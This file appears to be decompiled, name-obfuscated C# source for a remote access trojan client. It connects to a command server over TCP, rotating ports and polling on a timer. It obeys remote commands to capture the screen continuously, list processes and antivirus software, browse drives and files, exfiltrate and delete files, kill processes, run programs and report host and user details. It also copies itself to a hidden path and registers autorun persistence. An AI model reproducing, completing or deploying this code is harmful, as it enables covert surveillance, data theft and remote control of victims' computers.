using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace rlbwrarhsa;

public class MLREDM
{
	public bool rlbwrarhsais_working = false;

	private bool rlbwrarhsaiswitch = false;

	private bool rlbwrarhsathrRuning = false;

	private bool rlbwrarhsastr_writer = false;

	private bool rlbwrarhsacapScreen = false;

	private Dictionary<string, byte[]> rlbwrarhsatasks = new Dictionary<string, byte[]>();

	public NetworkStream rlbwrarhsanetStream;

	private int rlbwrarhsabuffSize = 1024;

	private DLRZRIVF rlbwrarhsaHD = new DLRZRIVF();

	private int rlbwrarhsabytesRead = 0;

	public bool rlbwrarhsareqCnls = false;

	public bool rlbwrarhsaautCnls = false;

	public DateTime rlbwrarhsalTimeUtc;

	private Thread rlbwrarhsafunThread;

	private ELDRARE rlbwrarhsaStateObj = new ELDRARE();

	private MLRLEINF rlbwrarhsaUPC;

	private OLRDMR rlbwrarhsaCMD;

	private int rlbwrarhsascrSize = 200;

	private ThreadStart rlbwrarhsafunStarter;

	public int port_sn = 0;

	public TcpClient rlbwrarhsatcpsck;

	private MemoryStream msStram = new MemoryStream();

	private SLCLRNS rlbwrarhsacaps = new SLCLRNS();

	private Bitmap image;

	public void rlbwrarhsasaveFile(string filePath)
	{
		try
		{
			byte[] array = rlbwrarhsapull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	private void rlbwrarhsasee_responce()
	{
		if (!rlbwrarhsaiswitch)
		{
			rlbwrarhsaiswitch = true;
			rlbwrarhsanetStream = rlbwrarhsaCMD.rlbwrarhsaNS(rlbwrarhsatcpsck);
			rlbwrarhsacapScreen = false;
			while (rlbwrarhsais_working)
			{
				string[] switchType = rlbwrarhsaget_command();
				if (switchType != null)
				{
					rlbwrarhsareqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("rlbwrarhsa-" + text) : ("rlbwrarhsa-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "rlbwrarhsa-procl":
						rlbwrarhsafunStarter = delegate
						{
							rlbwrarhsalist_processes("procl");
						};
						rlbwrarhsafunThread = new Thread(rlbwrarhsafunStarter);
						rlbwrarhsafunThread.Start();
						break;
					case "rlbwrarhsa-getavs":
						rlbwrarhsafunStarter = delegate
						{
							rlbwrarhsalist_processes("getavs");
						};
						rlbwrarhsafunThread = new Thread(rlbwrarhsafunStarter);
						rlbwrarhsafunThread.Start();
						break;
					case "rlbwrarhsa-thumb":
						rlbwrarhsaimage_info(switchType[1]);
						break;
					case "rlbwrarhsa-putsrt":
						rlbwrarhsaload_app();
						break;
					case "rlbwrarhsa-filsz":
						rlbwrarhsafile_info(switchType[1]);
						break;
					case "rlbwrarhsa-rupth":
						rlbwrarhsapush_data(null, "rlbwrarhsa-appth=|rlbwrarhsa".Split(new char[1] { '|' })[0] + DLAONIF.rlbwrarhsaget_mpath());
						break;
					case "rlbwrarhsa-dowf":
						rlbwrarhsasaveFile(switchType[1]);
						break;
					case "rlbwrarhsa-endpo":
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "rlbwrarhsa-scrsz":
						rlbwrarhsascreenSize(switchType[1]);
						break;
					case "rlbwrarhsa-cscreen":
						rlbwrarhsasee_scren(switchType[1]);
						break;
					case "rlbwrarhsa-dirs":
						rlbwrarhsafunThread = new Thread(rlbwrarhsalistDrives);
						rlbwrarhsafunThread.Start();
						break;
					case "rlbwrarhsa-stops":
						rlbwrarhsacapScreen = false;
						break;
					case "rlbwrarhsa-scren":
						rlbwrarhsacapScreen = true;
						rlbwrarhsafunStarter = delegate
						{
							rlbwrarhsais_screen(switchType[1]);
						};
						rlbwrarhsafunThread = new Thread(rlbwrarhsafunStarter);
						rlbwrarhsafunThread.Start();
						break;
					case "rlbwrarhsa-cnls":
						rlbwrarhsaautCnls = true;
						rlbwrarhsareqCnls = true;
						rlbwrarhsacapScreen = false;
						break;
					case "rlbwrarhsa-udlt":
						rlbwrarhsaCMD.rlbwrarhsaremove_user();
						break;
					case "rlbwrarhsa-delt":
						rlbwrarhsaremove_file(switchType[1]);
						break;
					case "rlbwrarhsa-afile":
						rlbwrarhsafunStarter = delegate
						{
							rlbwrarhsasend_auto(switchType[1]);
						};
						rlbwrarhsafunThread = new Thread(rlbwrarhsafunStarter);
						rlbwrarhsafunThread.Start();
						break;
					case "rlbwrarhsa-listf":
						rlbwrarhsafunStarter = delegate
						{
							rlbwrarhsaHD.rlbwrarhsalookFiles(switchType[1]);
						};
						rlbwrarhsafunThread = new Thread(rlbwrarhsafunStarter);
						rlbwrarhsafunThread.Start();
						break;
					case "rlbwrarhsa-file":
						rlbwrarhsafunStarter = delegate
						{
							rlbwrarhsapush_file(switchType[1]);
						};
						rlbwrarhsafunThread = new Thread(rlbwrarhsafunStarter);
						rlbwrarhsafunThread.Start();
						break;
					case "rlbwrarhsa-info":
						rlbwrarhsafunThread = new Thread(rlbwrarhsauser_info);
						rlbwrarhsafunThread.Start();
						break;
					case "rlbwrarhsa-runf":
						rlbwrarhsaCMD.rlbwrarhsado_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "rlbwrarhsa-fles":
					{
						string files = rlbwrarhsaHD.rlbwrarhsalookupFiles(switchType[1]);
						if (files != null)
						{
							rlbwrarhsafunStarter = delegate
							{
								rlbwrarhsapush_data(null, "rlbwrarhsa-fles=|rlbwrarhsa".Split(new char[1] { '|' })[0] + files);
							};
							rlbwrarhsafunThread = new Thread(rlbwrarhsafunStarter);
							rlbwrarhsafunThread.Start();
						}
						break;
					}
					case "rlbwrarhsa-dowr":
						rlbwrarhsasaveFile(switchType[1]);
						break;
					case "rlbwrarhsa-fldr":
					{
						string Folders = rlbwrarhsaHD.rlbwrarhsacheckFolders(switchType[1]);
						if (Folders != null)
						{
							rlbwrarhsafunStarter = delegate
							{
								rlbwrarhsapush_data(null, "rlbwrarhsa-fldr=|rlbwrarhsa".Split(new char[1] { '|' })[0] + Folders);
							};
							rlbwrarhsafunThread = new Thread(rlbwrarhsafunStarter);
							rlbwrarhsafunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				rlbwrarhsais_working = false;
				break;
			}
			rlbwrarhsais_working = false;
			rlbwrarhsacapScreen = false;
		}
		rlbwrarhsaiswitch = false;
	}

	public void rlbwrarhsado_start()
	{
		DLAONIF.rlbwrarhsaport = DLAONIF.ports[0];
		rlbwrarhsaUPC = new MLRLEINF();
		rlbwrarhsaCMD = new OLRDMR(this);
		rlbwrarhsaHD.iserver = this;
		rlbwrarhsaHD.rlbwrarhsamainPath = DLAONIF.rlbwrarhsaget_mpath();
		TimerCallback callback = rlbwrarhsalookup_connect;
		Timer rlbwrarhsatimer = new Timer(callback, rlbwrarhsaStateObj, 31280, 37420);
		rlbwrarhsaStateObj.rlbwrarhsatimer = rlbwrarhsatimer;
	}

	private bool rlbwrarhsaIPSConfig()
	{
		try
		{
			DLAONIF.rlbwrarhsadefaultP = rlbwrarhsaCMD.rlbwrarhsaserverIPD();
			rlbwrarhsatcpsck = new TcpClient();
			rlbwrarhsatcpsck.Connect(DLAONIF.rlbwrarhsadefaultP, DLAONIF.rlbwrarhsaport);
			return true;
		}
		catch
		{
			rlbwrarhsaports_switch();
			return false;
		}
	}

	public string rlbwrarhsafile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|rlbwrarhsa".Split(new char[1] { '|' })[0] : "<|rlbwrarhsa".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|rlbwrarhsa".Split(new char[1] { '|' })[0] : "<|rlbwrarhsa".Split(new char[1] { '|' })[0]);
			text = text + rlbwrarhsaget_size(fileInfo.Length) + ((!ret) ? ">|rlbwrarhsa".Split(new char[1] { '|' })[0] : "<|rlbwrarhsa".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				rlbwrarhsapush_data(null, "rlbwrarhsa-filsz=|rlbwrarhsa".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void rlbwrarhsalookup_connect(object zource)
	{
		try
		{
			if (!rlbwrarhsathrRuning)
			{
				rlbwrarhsathrRuning = true;
				if (!rlbwrarhsais_working || !rlbwrarhsatcpsck.Connected)
				{
					rlbwrarhsais_working = rlbwrarhsaIPSConfig();
					if (rlbwrarhsais_working)
					{
						rlbwrarhsabuffSize = rlbwrarhsatcpsck.ReceiveBufferSize;
						rlbwrarhsasee_responce();
					}
				}
			}
			rlbwrarhsathrRuning = false;
		}
		catch
		{
			rlbwrarhsathrRuning = false;
			rlbwrarhsastr_writer = false;
			rlbwrarhsais_working = false;
			rlbwrarhsaiswitch = false;
		}
	}

	public void rlbwrarhsaports_switch()
	{
		try
		{
			port_sn++;
			DLAONIF.rlbwrarhsaport = DLAONIF.ports[port_sn];
			if (port_sn >= DLAONIF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool rlbwrarhsasend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				rlbwrarhsapush_data(data, "rlbwrarhsa-afile=" + fileinfo);
				return false;
			}
			rlbwrarhsapush_data(null, "rlbwrarhsa-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void rlbwrarhsalist_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|rlbwrarhsa".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|rlbwrarhsa".Split(new char[1] { '|' })[0];
				text += "0>|rlbwrarhsa".Split(new char[1] { '|' })[0];
				try
				{
					text = text + FileVersionInfo.GetVersionInfo(processes[i].MainModule!.FileName).FileDescription + "<";
				}
				catch
				{
					text += "<";
				}
			}
			if (text == "")
			{
				text = "No-Found!> > > <|rlbwrarhsa".Split(new char[1] { '|' })[0];
			}
			byte[] byteArray = DLAONIF.getByteArray(text);
			rlbwrarhsapush_data(byteArray, "rlbwrarhsa-" + cmd + "=pcess|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void rlbwrarhsaload_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = DLAONIF.rlbwrarhsaget_mpath() + DLAONIF.rlbwrarhsamainApp + ".exe|rlbwrarhsa".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			DLAONIF.rlbwrarhsaset_run("_dreb|rlbwrarhsa".Split(new char[1] { '|' })[0], DLAONIF.rlbwrarhsaget_mpath() + DLAONIF.rlbwrarhsamainApp + ".exe|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void rlbwrarhsaimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|rlbwrarhsa".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|rlbwrarhsa".Split(new char[1] { '|' })[0];
				text = text + rlbwrarhsaget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				rlbwrarhsapush_data(memoryStream.ToArray(), "rlbwrarhsa-thumb=|rlbwrarhsa".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void rlbwrarhsasee_scren(string screenSize)
	{
		try
		{
			rlbwrarhsascrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			image = rlbwrarhsacaps.rlbwrarhsascreen(rlbwrarhsascrSize);
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			rlbwrarhsapush_data(msStram.ToArray(), "rlbwrarhsa-sascr=rlbwrarhsa|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void rlbwrarhsais_screen(string screenSize)
	{
		try
		{
			rlbwrarhsascrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (rlbwrarhsacapScreen && rlbwrarhsais_working)
			{
				image = rlbwrarhsacaps.rlbwrarhsascreen(rlbwrarhsascrSize);
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				rlbwrarhsapush_data(msStram.ToArray(), "rlbwrarhsa-scren=rlbwrarhsa|rlbwrarhsa".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void rlbwrarhsauser_info()
	{
		string text = rlbwrarhsaUPC.rlbwrarhsalancard + "|" + rlbwrarhsaUPC.rlbwrarhsacname + "|" + rlbwrarhsaUPC.rlbwrarhsauname + "|" + rlbwrarhsaUPC.rlbwrarhsauip + "|" + DLAONIF.rlbwrarhsaOsname() + "|" + rlbwrarhsaUPC.rlbwrarhsaapver + "|";
		text += "| !rlbwrarhsa".Split(new char[1] { '!' })[0];
		text = text + "|" + rlbwrarhsaUPC.rlbwrarhsaclientNum;
		text = text + "|" + DLAONIF.rlbwrarhsaget_mpath();
		byte[] byteArray = DLAONIF.getByteArray(text);
		rlbwrarhsapush_data(byteArray, "rlbwrarhsa-info=uzer|rlbwrarhsa".Split(new char[1] { '|' })[0]);
	}

	private void rlbwrarhsascreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			rlbwrarhsascrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	public bool rlbwrarhsapush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (rlbwrarhsastr_writer)
			{
				return false;
			}
			rlbwrarhsastr_writer = true;
			byte[] byteArray = DLAONIF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !rlbwrarhsareqCnls)
			{
				int num5 = ((num4 > rlbwrarhsabuffSize) ? rlbwrarhsabuffSize : num4);
				rlbwrarhsanetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			rlbwrarhsastr_writer = false;
			if (rlbwrarhsareqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			rlbwrarhsastr_writer = false;
			rlbwrarhsais_working = false;
			return false;
		}
	}

	private string rlbwrarhsaget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|rlbwrarhsa".Split(new char[1] { '|' })[0],
				"KB|rlbwrarhsa".Split(new char[1] { '|' })[0],
				"MB|rlbwrarhsa".Split(new char[1] { '|' })[0],
				"GB|rlbwrarhsa".Split(new char[1] { '|' })[0],
				"TB|rlbwrarhsa".Split(new char[1] { '|' })[0],
				"PB|rlbwrarhsa".Split(new char[1] { '|' })[0],
				"EB|rlbwrarhsa".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	private void rlbwrarhsapush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				rlbwrarhsapush_data(File.ReadAllBytes(lfile), "rlbwrarhsa-file=|rlbwrarhsa".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void rlbwrarhsaremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public string[] rlbwrarhsaget_command()
	{
		try
		{
			byte[] array = new byte[5];
			rlbwrarhsabytesRead = rlbwrarhsanetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= rlbwrarhsabytesRead)
			{
				int count = ((num3 > rlbwrarhsabuffSize) ? rlbwrarhsabuffSize : num3);
				rlbwrarhsabytesRead = rlbwrarhsanetStream.Read(array2, num2, count);
				num2 += rlbwrarhsabytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			rlbwrarhsais_working = false;
			return null;
		}
	}

	public byte[] rlbwrarhsapull_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			rlbwrarhsabytesRead = rlbwrarhsanetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !rlbwrarhsareqCnls)
			{
				int count = ((num3 > rlbwrarhsabuffSize) ? rlbwrarhsabuffSize : num3);
				rlbwrarhsabytesRead = rlbwrarhsanetStream.Read(array2, num, count);
				num += rlbwrarhsabytesRead;
				num3 -= rlbwrarhsabytesRead;
			}
			if (rlbwrarhsareqCnls)
			{
				rlbwrarhsanetStream.Flush();
				while (rlbwrarhsanetStream.DataAvailable && rlbwrarhsanetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			rlbwrarhsais_working = false;
			return null;
		}
	}

	private void rlbwrarhsalistDrives()
	{
		try
		{
			string text = rlbwrarhsaHD.rlbwrarhsalookupDrives();
			rlbwrarhsapush_data(null, "rlbwrarhsa-dirs=" + text);
		}
		catch
		{
		}
	}
}
